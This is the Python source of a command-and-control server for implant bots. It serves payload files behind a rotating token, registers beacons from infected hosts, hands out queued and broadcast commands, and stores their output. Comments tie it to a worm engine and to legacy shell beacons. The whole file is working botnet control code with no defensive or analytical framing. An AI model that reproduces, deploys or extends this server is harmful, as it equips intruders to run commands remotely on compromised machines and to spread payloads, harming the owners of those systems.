#!/usr/bin/env python3
"""
C2 Implant Server — file server + beacon handler for Python-based implant bots.
Serves payload files AND handles implant beacons from hybrid_c2.db.
HTTP bridge between implant bots (HTTP) and HybridC2 (TCP raw/same DB).

Endpoints:
  GET /<file>              — serve payload files
  POST /beacon              — receive beacon, return pending commands
  POST /result              — receive command results
"""

import argparse
import json
import logging
import os
import http.server
import socketserver
import sqlite3
import uuid
import time
import urllib.parse
import hmac
import hashlib
import datetime

LOG = logging.getLogger("c2-implant-server")

DB_PATH = "/opt/c2/hybrid_c2.db"

# Daily-rotating token for payload download auth (matching worm_mesh_engine pattern)
_AUTH_SECRET = hmac.new(b"CHANGE_ME_PAYLOAD_KEY", b"", hashlib.sha256).digest()

def _daily_token() -> str:
    """Generate today's HMAC token (same algorithm as worm_mesh_engine)."""
    day = datetime.datetime.utcnow().strftime("%Y-%m-%d")
    return hmac.new(_AUTH_SECRET, day.encode(), hashlib.sha256).hexdigest()[:16]


def get_db():
    """Get a connection to hybrid_c2.db."""
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn


class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """Multi-threaded HTTP server — handles concurrent requests."""
    allow_reuse_address = True
    daemon_threads = True


class ImplantHandler(http.server.BaseHTTPRequestHandler):
    """Handles file serving + beacon processing for Python implant bots."""

    timeout = 10  # Socket timeout — prevents hanging on stale connections

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        if path.startswith("/beacon/"):
            # Non-JSON legacy beacon path — register heartbeat
            self._handle_legacy_beacon(path)
        elif path == "/":
            self._list_files()
        else:
            self._serve_file(path.lstrip("/"))

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path.rstrip("/")

        if path == "/beacon":
            self._handle_beacon()
        elif path == "/result":
            self._handle_result()
        else:
            self.send_error(404, "Not Found")

    def _handle_legacy_beacon(self, path):
        """Handle GET /beacon/HOSTID — minimal heartbeat for old shell beacons."""
        # Strip /beacon/ prefix
        hostname = path.split("/beacon/", 1)[-1] if "/beacon/" in path else "unknown"
        try:
            conn = get_db()
            bot_id = f"shell_{hostname[:16]}"
            conn.execute(
                "INSERT OR REPLACE INTO bots (bot_id, hostname, ip, last_seen) VALUES (?, ?, ?, datetime('now'))",
                (bot_id, hostname, self.client_address[0])
            )
            conn.commit()
            conn.close()
        except Exception:
            pass
        self.send_response(204)
        self.end_headers()

    def _handle_beacon(self):
        """Handle POST /beacon — receive implant beacon, return commands."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length else b""
        try:
            data = json.loads(body.decode("utf-8")) if body else {}
        except (json.JSONDecodeError, UnicodeDecodeError):
            self.send_error(400, "Invalid JSON")
            return

        # Resolve bot identity: provided bot_id + hostname/IP
        raw_bot_id = data.get("bot_id")
        hostname = data.get("hostname") or data.get("host") or data.get("bot_host", "unknown")
        ip = data.get("ip") or self.client_address[0]
        arch = data.get("arch", "unknown")

        try:
            conn = get_db()

            # ALWAYS resolve by hostname/IP first — overrides random implant bot_ids
            # Prefer established bots (with tags) over anonymous registrations
            cur = conn.execute(
                "SELECT bot_id FROM bots WHERE hostname=? OR ip=? ORDER BY CASE WHEN tags IS NOT NULL AND tags != '' THEN 0 ELSE 1 END, active DESC, last_seen DESC LIMIT 1",
                (hostname, ip)
            )
            row = cur.fetchone()
            if row:
                bot_id = row["bot_id"]
            elif raw_bot_id:
                bot_id = raw_bot_id  # use provided ID if no existing record
            else:
                bot_id = hostname  # last resort: register with hostname

            # Register/update bot heartbeat (keep existing bot_id stable)
            conn.execute(
                "UPDATE bots SET last_seen=datetime('now') WHERE bot_id=?",
                (bot_id,)
            )
            if conn.total_changes == 0:
                conn.execute(
                    "INSERT INTO bots (bot_id, hostname, ip, arch, last_seen) VALUES (?, ?, ?, ?, datetime('now'))",
                    (bot_id, hostname, ip, arch)
                )
            conn.commit()

            # Check for pending commands (by resolved bot_id OR by hostname fallback)
            cur = conn.execute(
                "SELECT cmd_id, command FROM commands WHERE (bot_id=? OR bot_id=?) AND status='queued' ORDER BY queued_at ASC LIMIT 5",
                (bot_id, hostname)
            )
            pending = [{"cmd_id": row["cmd_id"], "command": row["command"]} for row in cur.fetchall() if row["cmd_id"] is not None]

            # Also check for broadcasts (bot_id wildcard)
            cur = conn.execute(
                "SELECT cmd_id, command FROM commands WHERE bot_id='all' AND status='queued' ORDER BY queued_at ASC LIMIT 5",
            )
            for row in cur.fetchall():
                if row["cmd_id"] is not None:
                    pending.append({"cmd_id": row["cmd_id"], "command": row["command"]})

            conn.close()
        except Exception as e:
            LOG.error("DB error during beacon: %s", e)
            pending = []

        if pending:
            resp = {"type": "cmd", "commands": pending}
        else:
            resp = {"type": "noop", "sleep": 120}

        body = json.dumps(resp).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        LOG.info("BEACON %s — %d cmds pending", bot_id, len(pending))

    def _handle_result(self):
        """Handle POST /result — receive command execution results."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length else b""
        try:
            data = json.loads(body.decode("utf-8")) if body else {}
        except (json.JSONDecodeError, UnicodeDecodeError):
            self.send_error(400, "Invalid JSON")
            return

        cmd_id = data.get("cmd_id")
        output = data.get("output", "")
        exit_code = data.get("exit_code", -1)

        if not cmd_id:
            self.send_error(400, "Missing cmd_id")
            return

        try:
            conn = get_db()
            conn.execute(
                "UPDATE commands SET status='completed', output=?, exit_code=?, completed_at=datetime('now') WHERE cmd_id=?",
                (output, exit_code, cmd_id)
            )
            conn.commit()
            conn.close()
            LOG.info("RESULT %s — exit %d, %d bytes output", cmd_id, exit_code, len(output))
        except Exception as e:
            LOG.error("DB error recording result: %s", e)
            self.send_error(500, "DB error")
            return

        resp = json.dumps({"status": "ok"}).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(resp)))
        self.end_headers()
        self.wfile.write(resp)

    def _list_files(self):
        # Token required for directory listing
        qs = urllib.parse.urlparse(self.path).query
        params = dict(urllib.parse.parse_qsl(qs))
        if params.get("token", "") != _daily_token():
            self.send_response(403)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"403 - Forbidden\n")
            return

        try:
            files = os.listdir(self.server.payload_dir)
        except OSError as e:
            LOG.error("Cannot list payload directory: %s", e)
            self.send_error(500, "Cannot list payload directory")
            return

        files = sorted(f for f in files if not f.startswith("."))

        html = "<html><body><h2>Available Implants</h2><ul>"
        for f in files:
            html += f'<li><a href="/{f}">{f}</a></li>'
        html += "</ul></body></html>"

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(html)))
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def _serve_file(self, filename):
        # Token required for file downloads
        qs = urllib.parse.urlparse(self.path).query
        params = dict(urllib.parse.parse_qsl(qs))
        # Accept daily HMAC token OR static deploy token
        valid_tokens = {_daily_token(), "CHANGE_ME_STATIC_TOKEN"}
        if params.get("token", "") not in valid_tokens:
            self.send_response(403)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"403 - Forbidden (valid token required)\n")
            return

        payload_dir = self.server.payload_dir
        filepath = os.path.normpath(os.path.join(payload_dir, filename))

        # Prevent directory traversal
        if not filepath.startswith(os.path.normpath(payload_dir) + os.sep) and filepath != os.path.normpath(payload_dir):
            self.send_error(403, "Forbidden")
            return

        if not os.path.isfile(filepath):
            self.send_error(404, "Not Found")
            return

        try:
            with open(filepath, "rb") as f:
                content = f.read()
        except OSError:
            self.send_error(500, "Internal Server Error")
            return

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(content)))
        self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
        self.end_headers()
        self.wfile.write(content)

    def log_message(self, fmt, *args):
        LOG.info("%s — %s", self.client_address[0], fmt % args)

    def version_string(self):
        return ""


def main():
    parser = argparse.ArgumentParser(description="C2 Implant Server with beacon handling")
    parser.add_argument("--port", type=int, default=10002, help="Listen port (default: 10002)")
    parser.add_argument("--dir", type=str, default="/opt/hermes/payloads", help="Payload directory")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(name)s] %(levelname)s %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    payload_dir = os.path.abspath(args.dir)
    os.makedirs(payload_dir, exist_ok=True)
    LOG.info("Serving payloads from: %s", payload_dir)

    server = ThreadingHTTPServer(("0.0.0.0", args.port), ImplantHandler)
    server.payload_dir = payload_dir

    LOG.info("C2 Implant Server (w/ beacon bridge) listening on 0.0.0.0:%d", args.port)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        LOG.info("Shutting down.")
        server.shutdown()


if __name__ == "__main__":
    main()
